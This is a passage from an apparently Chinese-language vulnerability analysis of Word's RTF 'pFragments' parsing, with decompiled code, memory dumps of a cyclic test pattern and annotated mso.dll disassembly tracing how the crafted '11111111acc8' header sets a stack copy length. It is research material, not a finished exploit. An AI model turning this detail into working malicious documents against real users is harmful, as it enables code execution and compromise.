class="keyword">goto</span> LABEL_46;</span><br><span class="line">    <span class="comment">// rtf中数据是以16进制形式存储的，这里将16进制数据转化为字符</span></span><br><span class="line">    <span class="comment">// 如：3431 3631 -&gt; 41 61</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( pFragments_value[index] &lt; (<span class="keyword">unsigned</span> __int8)<span class="string">'0'</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">        *mem_lock_ptr = <span class="number">0</span>;</span><br><span class="line">        chr_hex = pFragments_value[index];</span><br><span class="line">        <span class="keyword">if</span> ( chr_hex &gt;= <span class="string">'0'</span> &amp;&amp; chr_hex &lt;= <span class="string">'9'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            chr = chr_hex - <span class="string">'0'</span>;</span><br><span class="line">LABEL_36:</span><br><span class="line">            *mem_lock_ptr = chr;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( chr_hex &gt;= <span class="string">'a'</span> &amp;&amp; chr_hex &lt;= <span class="string">'f'</span> )     <span class="comment">// 字母小写转大写</span></span><br><span class="line">        &#123;</span><br><span class="line">            chr = (chr_hex | <span class="string">' '</span>) - <span class="number">87</span>;             <span class="comment">// 'a'-&gt;A(int)</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_37:</span><br><span class="line">        *mem_lock_ptr *= <span class="number">16</span>;        <span class="comment">// 左移4位</span></span><br><span class="line">        new_char = *mem_lock_ptr;   <span class="comment">// 当前字符作为16进制高4位字符</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            ++index;</span><br><span class="line">        <span class="keyword">while</span> ( pFragments_value[index] &lt; (<span class="keyword">unsigned</span> __int8)<span class="string">'0'</span> &amp;&amp; index &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)count2 );</span><br><span class="line">        chr_hex1 = pFragments_value[index];</span><br><span class="line">        <span class="keyword">if</span> ( chr_hex1 &lt; <span class="string">'0'</span> || chr_hex1 &gt; <span class="string">'9'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( chr_hex1 &gt;= <span class="string">'a'</span> &amp;&amp; chr_hex1 &lt;= <span class="string">'f'</span> )               <span class="comment">// 字母小写转大写</span></span><br><span class="line">                *mem_lock_ptr = new_char + (chr_hex1 | <span class="string">' '</span>) - <span class="number">87</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            *mem_lock_ptr = chr_hex1 + new_char - <span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++mem_lock_ptr;</span><br><span class="line">LABEL_44:</span><br><span class="line">        ++index;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( index &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)count2 );</span><br><span class="line">    v39 = group_part_ptr1;</span><br><span class="line">LABEL_46:</span><br><span class="line">    v17 = GlobalHandle(pMem);                     <span class="comment">// 与GlobalLock作用相反</span></span><br><span class="line">    CreateStreamOnHGlobal(v17, <span class="number">1</span>, &amp;el_count);</span><br><span class="line">    (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span> *, LPSTREAM))(*key_object + <span class="number">0x38</span>))(key_object, el_count);</span><br><span class="line">    el_count-&gt;lpVtbl-&gt;Release(el_count);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过对<code>sub_31FD724E</code>函数的伪代码分析可知，Word在解析完<code>“pFragments”</code>属性值数组参数<code>el_size</code>后，会利用一个<code>switch-case</code>语句对<code>el_size</code>的值进行判断，如果为<code>2,4,8</code>会进行额外处理，<code>非2,4,8</code>则默认不会处理。而如果为<code>0</code>的话，会在<code>MSO_379</code>-&gt;<code>MSO_501</code>-&gt;<code>sub_32608E17</code>-&gt;<code>sub_32608E81</code>中的<code>&quot;32608EAE div ecx&quot;</code>处出错，<code>el_size</code>被当做”div ecx”中的<code>除数</code>(ecx)，造成<code>除数为0</code>的错误。</p><p>&emsp;&emsp;继续往下执行，Word会对<code>“pFragments”</code>属性值<code>数组参数</code>后面的数据进行处理。在<code>RTF</code>中，字符<code>“A”</code>是以其16进制值<code>“41”</code>的16进制值<code>“3431”</code>进行存储的，所以<code>Word</code>会对<code>RTF</code>文档中的数据进行一次转化，<code>转化过程</code>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Address   0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F   ASCII</span><br><span class="line">023A0004  31 31 31 31 31 31 31 31 61 63 63 38 34 31 36 31  11111111acc84161</span><br><span class="line">023A0014  33 30 34 31 36 31 33 31 34 31 36 31 33 32 34 31  3041613141613241</span><br><span class="line">023A0024  36 31 33 33 34 31 36 31 33 34 34 31 36 31 33 35  6133416134416135</span><br><span class="line">023A0034  34 31 36 31 33 36 34 31 36 31 33 37 34 31 36 31  4161364161374161</span><br><span class="line">023A0044  33 38 34 31 36 31 33 39 34 31 36 32 33 30 34 31  3841613941623041</span><br><span class="line">023A0054  36 32 33 31 34 31 36 32 33 32 34 31 36 32 33 33  6231416232416233</span><br><span class="line">023A0064  34 31 36 32 33 34 34 31 36 32 33 35 34 31 36 32  4162344162354162</span><br><span class="line">023A0074  33 36 34 31 36 32 33 37 34 31 36 32 33 38 34 31  3641623741623841</span><br><span class="line">023A0084  36 32 33 39 34 31 36 33 33 30 34 31 36 33 33 31  6239416330416331</span><br><span class="line">023A0094  34 31 36 33 33 32 34 31 36 33 33 33 34 31 36 33  4163324163334163</span><br><span class="line">023A00A4  33 34 34 31 36 33 33 35 34 31 36 33 33 36 34 31  3441633541633641</span><br><span class="line">023A00B4  36 33 33 37 34 31 36 33 33 38 34 31 36 33 33 39  6337416338416339</span><br><span class="line">        |       |                                   |       |</span><br><span class="line">        ↓       ↓                                   ↓       ↓</span><br><span class="line">Address   0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F   ASCII</span><br><span class="line">003AFF68  11 11 11 11 AC C8 41 61 30 41 61 31 41 61 32 41  Aa0Aa1Aa2A</span><br><span class="line">003AFF78  61 33 41 61 34 41 61 35 41 61 36 41 61 37 41 61  a3Aa4Aa5Aa6Aa7Aa</span><br><span class="line">003AFF88  38 41 61 39 41 62 30 41 62 31 41 62 32 41 62 33  8Aa9Ab0Ab1Ab2Ab3</span><br><span class="line">003AFF98  41 62 34 41 62 35 41 62 36 41 62 37 41 62 38 41  Ab4Ab5Ab6Ab7Ab8A</span><br><span class="line">003AFFA8  62 39 41 63 30 41 63 31 41 63 32 41 63 33 41 63  b9Ac0Ac1Ac2Ac3Ac</span><br><span class="line">003AFFB8  34 41 63 35 41 63 36 41 63 37 41 63 38 41 63 39  4Ac5Ac6Ac7Ac8Ac9</span><br><span class="line">003AFFC8  41 64 30 41 64 31 41 64 32 41 64 33 41 64 34 41  Ad0Ad1Ad2Ad3Ad4A</span><br><span class="line">003AFFD8  64 35 41 64 36 41 64 37 41 64 38 41 64 39 41 65  d5Ad6Ad7Ad8Ad9Ae</span><br><span class="line">003AFFE8  30 41 65 31 41 65 32 41 65 33 41 65 34 41 65 35  0Ae1Ae2Ae3Ae4Ae5</span><br><span class="line">003AFFF8  41 65 36 41 65 37 41 65 38 41 65 39 41 66 30 41  Ae6Ae7Ae8Ae9Af0A</span><br><span class="line">003B0008  66 31 41 66 32 41 66 33 41 66 34 41 66 35 41 66  f1Af2Af3Af4Af5Af</span><br><span class="line">003B0018  36 41 66 37 41 66 38 41 66 39 41 67 30 41 67 31  6Af7Af8Af9Ag0Ag1</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;经过测试<code>“pFragments”</code>属性值数组参数中的<code>el_size</code>可以是除了<code>“0,2,4,8”</code>之外的任何<code>10进制正整数</code>，如果为<code>“0,2,4,8”</code>中的任意一个，都会造成<code>Word奔溃</code>。而<code>el_count</code>则无限制，任何<code>10进制整数</code>都可以，<code>负的</code>也行。</p><h3 id="0x34-pFragments属性数据中“11111111acc8”的含义"><a href="#0x34-pFragments属性数据中“11111111acc8”的含义" class="headerlink" title="0x34 pFragments属性数据中“11111111acc8”的含义"></a>0x34 pFragments属性数据中“11111111acc8”的含义</h3><p><strong><code>环境：</code></strong>Win7&amp;Office2007</p><p>&emsp;&emsp;前面我们已经知道<code>“11111111acc8”</code>中的<code>“acc8”</code>为Word将<code>pFragments属性数据</code>复制到<code>栈</code>上的<code>数据长度</code>，可是为什么要<code>偏移8字节</code>呢，这8字节有什么<code>限制</code>吗？这些都是要搞清楚的。</p><p>&emsp;&emsp;从前面<code>对奔溃原因溯源</code>的调试中可以知道，复制数据长度<code>“0xc8ac”</code>是从<code>关键对象</code>(0x066a55e0)的<code>成员变量</code>中取出的，所以，我们知道对其下<code>内存写断点</code>，就可以断在<code>对此成员变量赋值</code>的位置，也就是对<code>“11111111acc8”</code>进行解析的代码处。</p><p><strong><code>找关键位置所用方法：</code></strong></p><blockquote><ul><li>1、在<code>Attach</code>目标程序后，对<code>0x066a55e0</code>对象的<code>第4个dword</code>下<code>内存写断点</code>(<code>0x066a55ec</code>为复制长度<code>0xc8ac</code>所在对象成员变量的内存地址)。</li><li>2、再运行程序，如果已经执行到之前<code>调试奔溃时</code>代码区域的最顶层函数<code>sub_32E5955E</code>,还未断下来，则关闭调试器，重新<code>再来一遍</code>。</li><li>3、直到某一次程序对<code>关键对象</code>的地址分配到<code>0x066a55e0</code>，则会断在对<code>关键对象</code>初始化的位置，这时注意OllyDbg的信息窗口中的信息，是否是对关键对象<code>0x066a55e0</code>的<code>第4个dword</code>赋值复制数据长度“0xc8ac”，如果是，则已经定位到解析<code>“11111111acc8”</code>的代码处。</li><li>4、然后根据<code>调用堆栈</code>，可以找到<code>当前函数地址</code>，以及当前函数的<code>调用地址</code>，及其<code>父函数</code>等等。</li></ul></blockquote><p>&emsp;&emsp;如此，我们已经找到解析<code>“11111111acc8”</code>的代码片段。<code>“acc8”</code>偏移<code>8字节</code>的原因以及<code>这8字节</code>是否有什么<code>限制</code>的代码应该就在附近，我们对找到的代码片段<code>详细分析</code>，画<code>“&lt;----”</code>的为关键位置，处理后的结果如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>319C0631 loc_319C0631:                           <span class="comment">; CODE XREF: sub_31FD724E-616C6D↑j</span></span><br><span class="line"><span class="symbol">.text:</span>319C0631                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+el_count]                  <span class="comment">;   eax = ebp-0x4 = 0x0011B268-0x4 = 0x0011B264</span></span><br><span class="line"><span class="symbol">.text:</span>319C0634                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; ppstm              ; arg3: eax = 0x0011B264</span></span><br><span class="line"><span class="symbol">.text:</span>319C0635                 <span class="keyword">push</span>    <span class="number">1</span>               <span class="comment">; fDeleteOnRelease   ; arg2: 1</span></span><br><span class="line"><span class="symbol">.text:</span>319C0637                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+pMem]      <span class="comment">; pMem               ; arg1: [ebp-0x1c] = [0x0011B268-0x1c] = [0x0011B24c] = 0x0026FAD8</span></span><br><span class="line">            <span class="comment">; 0026FAD8  11 11 11 11 AC C8 41 61 30 41 61 31 41 61 32 41  Aa0Aa1Aa2A</span></span><br><span class="line">            <span class="comment">; 0026FAE8  61 33 41 61 34 41 61 35 41 61 36 41 61 37 41 61  a3Aa4Aa5Aa6Aa7Aa</span></span><br><span class="line">            <span class="comment">; 0026FAF8  38 41 61 39 41 62 30 41 62 31 41 62 32 41 62 33  8Aa9Ab0Ab1Ab2Ab3</span></span><br><span class="line">            <span class="comment">; 0026FB08  41 62 34 41 62 35 41 62 36 41 62 37 41 62 38 41  Ab4Ab5Ab6Ab7Ab8A</span></span><br><span class="line">            <span class="comment">; 0026FB18  62 39 41 63 30 41 63 31 41 63 32 41 63 33 41 63  b9Ac0Ac1Ac2Ac3Ac</span></span><br><span class="line">            <span class="comment">; 0026FB28  34 41 63 35 41 63 36 41 63 37 41 63 38 41 63 39  4Ac5Ac6Ac7Ac8Ac9</span></span><br><span class="line">            <span class="comment">; 0026FB38  41 64 30 41 64 31 41 64 32 41 64 33 41 64 34 41  Ad0Ad1Ad2Ad3Ad4A</span></span><br><span class="line">            <span class="comment">; 0026FB48  64 35 41 64 36 41 64 37 41 64 38 41 64 39 41 65  d5Ad6Ad7Ad8Ad9Ae</span></span><br><span class="line">            <span class="comment">; 0026FB58  30 41 65 31 41 65 32 41 65 33 41 65 34 41 65 35  0Ae1Ae2Ae3Ae4Ae5</span></span><br><span class="line">            <span class="comment">; 0026FB68  41 65 36 41 65 37 41 65 38 41 65 39 41 66 30 41  Ae6Ae7Ae8Ae9Af0A</span></span><br><span class="line">            <span class="comment">; 0026FB78  66 31 41 66 32 41 66 33 41 66 34 41 66 35 41 66  f1Af2Af3Af4Af5Af</span></span><br><span class="line">            <span class="comment">; 0026FB88  36 41 66 37 41 66 38 41 66 39 41 67 30 41 67 31  6Af7Af8Af9Ag0Ag1</span></span><br><span class="line"><span class="symbol">.text:</span>319C063A                 <span class="keyword">call</span>    <span class="built_in">ds</span>:GlobalHandle                      <span class="comment">; GlobalHandle函数与GlobalLock函数作用相反</span></span><br><span class="line"><span class="symbol">.text:</span>319C0640                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; hGlobal            ; arg1: eax = 0x0026FAD8</span></span><br><span class="line"><span class="symbol">.text:</span>319C0641                 <span class="keyword">call</span>    <span class="built_in">ds</span>:CreateStreamOnHGlobal             <span class="comment">; CreateStreamOnHGlobal函数从指定内存创建流对象</span></span><br><span class="line"><span class="symbol">.text:</span>319C0647                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]                     <span class="comment">;   eax = [ebp-0x8] = [0x0011B268-0x8] = [0x0011B260] = 0x066A55E0(关键对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>319C064A                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+el_count]                       <span class="comment">; arg2: [ebp-0x4] = [0x0011B268-0x4] = [0x0011B264] = 0x06454B30(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>319C064D                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]                           <span class="comment">;   ecx = [eax] = [0x066A55E0] = 0x32A0C8C4(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>319C064F                 <span class="keyword">push</span>    <span class="built_in">eax</span>                                  <span class="comment">; arg1: eax = 0x066A55E0(关键对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>319C0650                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">38h</span>]                  <span class="comment">; mso.32E14136</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    *********************************************************</span><br><span class="line"></span><br><span class="line">        所属模块: mso.dll</span><br><span class="line">        signed <span class="keyword">int</span> __stdcall sub_32E14136(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span><br><span class="line"></span><br><span class="line">    *********************************************************</span><br><span class="line"><span class="symbol">    .text:</span>32E14136                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14137                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                         <span class="comment">;   ebp = esp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14139                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                              <span class="comment">;   ecx = 0x32A0C8C4(虚表指针)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1413A                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                              <span class="comment">;   ecx = 0x32A0C8C4(虚表指针)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1413B                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">;   ebx = 0x02340000</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1413C                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+arg_4]                 <span class="comment">;   ebx = [ebp+0xc] = [0x0011B1F4] = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1413F                 <span class="keyword">push</span>    <span class="built_in">esi</span>                              <span class="comment">;   esi = 0x023A0004, (ASCII "11111111acc84161304161314161324161334161344161354161364161374161384161394162304162314162324162334162")</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14140                 <span class="keyword">push</span>    <span class="built_in">edi</span>                              <span class="comment">;   edi = 0x00020026(pFragments属性值字节数，"11111111acc8....feff61&#125;&#125;&#125;"不算括号)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14141                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_4]                 <span class="comment">;   eax = ebp+0xc = 0x0011B1F4(a2地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14144                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg2: eax = 0x0011B1F4(a2地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14145                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">; arg1: ebx = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14146                 <span class="keyword">call</span>    sub_33287CC1                     <span class="comment">; [0x0011B1F4] = 0x06454B30 -&gt; 0x06451111 &lt;-----</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1414B                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1414D                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1414F                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_4]                 <span class="comment">;   eax = ebp-0x4 = 0x0011B1E4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14152                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg2: eax = 0x0011B1E4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14153                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">; arg1: ebx = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14154                 <span class="keyword">call</span>    sub_33287CC1                     <span class="comment">; [0x0011B1E4] = 0x32A0C8C4 -&gt; 0x32A01111 &lt;-----</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14159                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1415B                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1415D                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]                 <span class="comment">;   eax = ebp-8 = 0x0011B1E0</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14160                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg2: eax = 0x0011B1E0</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14161                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">; arg1: ebx = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14162                 <span class="keyword">call</span>    sub_33287CC1                     <span class="comment">; [0x0011B1E0] = 0x32A0C8C4 -&gt; 0x32A0C8AC &lt;-----</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14167                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14169                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1416B                 <span class="keyword">mov</span>     <span class="built_in">ax</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_4]         <span class="comment">;   ax = [ebp+0xc] = [0x0011B1F4] = 0x1111</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1416F                 <span class="keyword">cmp</span>     <span class="built_in">ax</span>, [<span class="built_in">ebp</span>+var_4]                  <span class="comment">;   ax = 0x1111,[ebp-0x4] = [0x0011B1E4] = 0x1111 &lt;-----两个word进行比较</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14173                 <span class="keyword">ja</span>      short loc_32E141C5               <span class="comment">;   大于则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14175                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_0]                 <span class="comment">;   esi = [ebp+0x8] = [0x0011B1F0] = 0x066A55E0(关键对象首地址)(a1)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14178                 <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">10h</span>]              <span class="comment">; arg1: [esi+0x10] = [0x066A55E0+0x10] = [0x066A55F0] = 0x066A5618</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1417B                 <span class="keyword">call</span>    _MsoFreePv@<span class="number">4</span>    <span class="comment">; MsoFreePv(x)   ; </span></span><br><span class="line"><span class="symbol">    .text:</span>32E14180                 <span class="keyword">mov</span>     <span class="built_in">ax</span>, [<span class="built_in">ebp</span>+var_8]                  <span class="comment">;   ax = [ebp-0x8] = [0x0011B1E8-0x8] = [0x0011B1E0] = 0xC8AC(复制数据长度)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14184                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">0Ch</span>], <span class="built_in">ax</span>                    <span class="comment">;   [esi+0xc] = [0x066A55E0+0xc] = [0x066A55EC] = ax = 0xC8AC(复制数据长度) &lt;---- 对关键对象成员变量赋值</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14188                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_4]                 <span class="comment">;   eax = [ebp-0x4] = [0x0011B1E4] = 0x00001111</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1418C                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg3: eax = 0x00001111</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1418D                 <span class="keyword">push</span>    <span class="number">4</span>                                <span class="comment">; arg2: 0x4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1418F                 <span class="keyword">lea</span>     <span class="built_in">edi</span>, [<span class="built_in">esi</span>+<span class="number">4</span>]                     <span class="comment">;   edi = esi+4 = 0x066A55E0+4 = 0x066A55E4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14192                 <span class="keyword">push</span>    <span class="built_in">edi</span>                              <span class="comment">; arg1: edi = 0x066A55E4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14193                 <span class="keyword">call</span>    MSO_501                          <span class="comment">; 对关键对象0x066A55E0中的成员变量赋值</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14198                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1419A                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1419C                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]                 <span class="comment">;   eax = [0x0011B1E8-0x8] = [0x0011B1E0] = 0x0000C8AC</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141A0                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_4]        <span class="comment">;   ecx = [ebp+0xc] = [0x0011B1F4] = 0x00001111</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141A4                 <span class="keyword">imul</span>    <span class="built_in">eax</span>, <span class="built_in">ecx</span>                         <span class="comment">;   eax = eax*ecx = 0x0D60BF6C</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141A7                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg3: eax = 0x0D60BF6C</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141A8                 <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">10h</span>]              <span class="comment">; arg2: [esi+0x10] = [0x066A55E0+0x10] = [0x066A55F0] = 0x1D400000</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141AB                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">; arg1: ebx = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141AC                 <span class="keyword">call</span>    sub_3277BE91                     <span class="comment">; </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        ******************************************************************</span><br><span class="line"></span><br><span class="line">            所属模块: mso.dll</span><br><span 